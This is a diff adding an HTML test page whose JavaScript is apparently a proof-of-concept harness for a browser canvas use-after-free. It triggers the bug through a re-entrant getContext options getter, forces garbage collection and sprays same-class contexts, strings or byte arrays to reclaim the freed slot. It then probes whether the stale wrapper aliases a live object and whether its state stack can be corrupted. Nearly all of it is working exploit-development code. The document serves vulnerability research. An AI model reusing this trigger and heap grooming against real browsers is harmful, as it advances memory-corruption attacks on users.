@@ -1,0 +1,177 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>canvasfield — is a same-type canvas occupation a *field-control* primitive?</title>
+<body><p id="p">canvasfield</p>
+<script>
+// docs/103, claim 1 from ZigZagBoi (via docs/90-canvas-claim-checked.md §Next 1), reproduced rather than cited.
+//
+// CVE-2026-43720: HTMLCanvasElement::getContext checks m_context, then converts the options dictionary (so a
+// getter runs JS), then createContextBitmapRenderer() overwrites m_context.  The wrapper from the inner call
+// outlives the context the outer call replaces.  Under IsoHeap only another CanvasRenderingContext2D can take
+// the freed slot, so the claim is *not* attacker bytes - it is that the stale wrapper ends up aliasing a live
+// spray context and its fields become read/write through both.
+//
+// arms:  spray=<n>  trigger, create n contexts, then use the stale wrapper
+//        nos=<n>    trigger, create n contexts, use a *fresh* wrapper (TD control: no staleness)
+//        nospray    trigger, then use the stale wrapper at once (occupation control)
+// The scored question is the alias, then whether any field that carries a *pointer* can be moved:
+//   sent  - write a distinctive value through every spray context, read it back through the stale wrapper
+//   stack - drive save()/restore() through the alias and watch the state stack (m_stateStack is buffer/size/cap)
+(function () {
+  'use strict';
+  function B(m, x) {
+    var q = '/ev?m=' + encodeURIComponent(String(m)) + (x ? '&' + x : '');
+    // bkind=sb is the console arm's transport (c043b used navigator.sendBeacon): it must not create a
+    // CachedImage, which is what steals the slot in the img arm below (docs/112).
+    try { if (K('bkind', 'img') === 'sb' && navigator.sendBeacon) { navigator.sendBeacon(q); return; } } catch (e) {}
+    try { (new Image()).src = q; } catch (e) {}
+  }
+  var Q = new URLSearchParams(location.search);
+  function K(k, d) { return Q.has(k) ? Q.get(k) : d; }
+  var ARM = K('arm', 'spray');
+  var N = Math.max(0, parseInt(K('n', '32'), 10));
+  var SENT = 777.25;
+
+  function mk() {
+    var c = document.createElement('canvas');
+    c.width = 8; c.height = 8;
+    document.body.appendChild(c);
+    return c;
+  }
+
+  // docs/112: the slot's address has to be measured from inside the process, so the trigger waits for an
+  // external 'go' (a file the runner writes once gdb has its breakpoints in). gate=1 only; the default path
+  // below is unchanged. boot is the pre-beacon the attach waits on (the trigger frees before it beacons).
+  function gateThen(fn) {
+    if (K('gate', '0') !== '1') return setTimeout(fn, 150);
+    var t0 = Date.now();
+    (function poll() {
+      fetch('/gate.txt?t=' + Date.now(), { cache: 'no-store' })
+        .then(function (r) { return r.text(); })
+        .then(function (t) {
+          if (String(t).indexOf('go') >= 0) fn();
+          else if (Date.now() - t0 > 180000) B('gatefail', 'ms=' + (Date.now() - t0));
+          else setTimeout(poll, 100);
+        })
+        .catch(function () { setTimeout(poll, 200); });
+    })();
+  }
+
+  function run() {
+    var cv = mk();
+    var stale = null, outer = null;
+
+    // the trigger: an options getter that re-enters getContext
+    var INNER = K('inner', '2d'), KIND = INNER;   // the spray must be the *same class* as the freed one
+    var opts = { get alpha() { try { stale = cv.getContext(INNER); } catch (e) { B('innerfail', 'e=' + e.name); } return false; } };
+    var OUTER = K('outer', 'bmr');
+    var TRIGLATE = K('btrig', 'early') === 'late';
+    try { outer = cv.getContext(OUTER === '2d' ? '2d' : 'bitmaprenderer', opts); }
+    catch (e) { B('trigfail', 'e=' + e.name + '&m=' + encodeURIComponent(String(e.message).slice(0, 60))); }
+    // docs/112: the trig beacon is itself a `new Image()` -> CachedImage allocation, and CachedImage shares the
+    // freed context's ASAN size class.  btrig=late moves that beacon after the spray so the spray is the first
+    // allocator user in the window (one variable: the beacon's position, not its existence).
+    if (!TRIGLATE) B('trig', 'inner=' + INNER + '&outerkind=' + OUTER + '&stale=' + (stale ? 1 : 0) + '&outer=' + (outer ? 1 : 0));
+    if (!stale) { B('done', 'x=1'); return; }
+
+    var keep = [], PRE = K('pre', '0') === '1', pre = [];
+    if (PRE) for (var pi = 0; pi < N; pi++) { var pc = document.createElement('canvas'); pc.width = 8; pc.height = 8; document.body.appendChild(pc); pre.push(pc); }
+    // The context is JS-owned, so the free needs a collection — and a collection does not run inside a
+    // binding call, so the churn is its own task.  Order: trigger -> churn (frees) -> spray (reclaims) -> use.
+    function churn(cb) {
+      var decoy = new WeakRef({ d: 1 });      // previous-job decoy: proves a collection happened
+      var junk = [];
+      for (var z = 0; z < 400000; z++) junk.push({ k: z });
+      junk = null;
+      B('gc', 'decoy=' + (decoy.deref() === undefined ? 'collected' : 'alive'));
+      cb();
+    }
+    function sprayThenUse() {
+      // pre=1: the canvases (a different class) are made before the trigger, so the reclaim window
+      // contains only CanvasRenderingContext2D allocations
+      if (ARM !== 'nospray' && PRE) for (var i = 0; i < N; i++) keep.push(pre[i].getContext('2d'));
+      else if (ARM !== 'nospray') for (var i = 0; i < N; i++) keep.push(mk().getContext(KIND));
+      if (TRIGLATE) B('trig', 'inner=' + INNER + '&outerkind=' + OUTER + '&stale=1&outer=1&late=1');
+      B('sprayed', 'n=' + keep.length + '&arm=' + ARM);
+      var use = (ARM === 'nos') ? mk().getContext('2d') : stale;
+      var tag = (ARM === 'nos') ? 'fresh' : 'stale';
+      rest(use, tag, keep);
+    }
+    if (ARM === 'u8') {
+      // class probe: 712-byte plain fastMalloc blocks (same size as the freed context).  If reuse works
+      // at all the crash moves off CanvasBase to a wild pc; if it does not, it stays where it is.
+      var u = [];
+      for (var q = 0; q < 64; q++) { var a = new Uint8Array(712); a.fill(0x41); u.push(a); }
+      B('u8', 'n=' + u.length);
+      try { stale.fillStyle = '#010203'; } catch (e) { B('usefail', 'e=' + e.name); }
+      B('done', 'arm=u8');
+      return;
+    }
+    if (ARM === 'str') {
+      // docs/112 cross-type arm: 80 allocations of the *same size* (712 B = StringImpl's 20-byte header + 692
+      // chars) but a different class.  atob's decoder allocates StringImpl::createUninitialized(692), which is
+      // the same fastMalloc(712) path the 2D context uses; the string is kept alive by the array.
+      var SB = K('sb', 'A692');
+      var s64 = '';
+      for (var z = 0; z < 230; z++) s64 += 'QUFB';
+      s64 += 'QUE=';
+      var strs = [];
+      for (var si = 0; si < N; si++) strs.push(atob(s64));
+      if (TRIGLATE) B('trig', 'inner=' + INNER + '&outerkind=' + OUTER + '&stale=1&outer=1&late=1');
+      B('strs', 'n=' + strs.length + '&len=' + (strs[0] ? strs[0].length : -1) + '&b=' + SB);
+      rest(stale, 'stale', []);
+      return;
+    }
+    if (ARM === 'probe') {
+      // is the wrapper's own object alive (canvas still reachable) or is the whole object gone?
+      setTimeout(function () {
+        try { B('probe', 'same=' + (stale.canvas === cv) + '&w=' + (stale.canvas ? stale.canvas.width : -1) + '&tag=' + (typeof stale.canvas)); }
+        catch (e) { B('probe', 'e=' + e.name); }
+        B('done', 'arm=probe');
+      }, 50);
+      return;
+    }
+    if (ARM === 'gc' || ARM === 'gcns') return setTimeout(function () { churn(sprayThenUse); }, 30);
+    return sprayThenUse();
+  }
+
+  function rest(use, tag, keep) {
+
+    // 1. is the wrapper usable at all
+    try { use.fillStyle = '#112233'; use.fillRect(0, 0, 1, 1); }
+    catch (e) { B('usefail', 'e=' + e.name + '&tag=' + tag); }
+
+    // 2. write the sentinel through every spray context, look for it through the wrapper
+    var hit = -1;
+    for (var j = 0; j < keep.length; j++) {
+      try { keep[j].translate(SENT + j, 0); } catch (e) {}
+    }
+    var seen = null;
+    try { seen = use.getTransform ? use.getTransform() : null; } catch (e) { B('readfail', 'e=' + e.name); }
+    if (seen) {
+      var ex = seen.e, fx = seen.f;
+      for (var k = 0; k < keep.length; k++) if (Math.abs(ex - (SENT + k)) < 0.001 || Math.abs(fx - (SENT + k)) < 0.001) { hit = k; break; }
+      B('sent', 'tag=' + tag + '&hit=' + hit + '&e=' + ex + '&f=' + fx + '&sprayed=' + keep.length);
+    }
+
+    // 3. state-stack probe: save() through the alias, then restore() more times than we saved
+    var sd = -1;
+    try { use.save(); use.translate(11, 22); use.restore(); sd = 0; } catch (e) { B('stackfail', 'e=' + e.name); }
+    try {
+      var t2 = use.getTransform();
+      B('stack', 'ok=' + sd + '&e=' + (t2 ? t2.e : '-') + '&sprayed=' + keep.length);
+    } catch (e) { B('stackread', 'e=' + e.name); }
+
+    // 4. how many restores until it throws (a moved stack size shows up here)
+    var over = 0, err = '';
+    try { for (var r = 0; r < 64; r++) { use.restore(); over++; } }
+    catch (e) { err = e.name; }
+    B('overrestore', 'n=' + over + '&err=' + (err || '-'));
+    B('done', 'arm=' + ARM);
+  }
+
+  B('boot', 'arm=' + ARM + '&n=' + N);
+  gateThen(run);
+})();
+</script>
+</body>
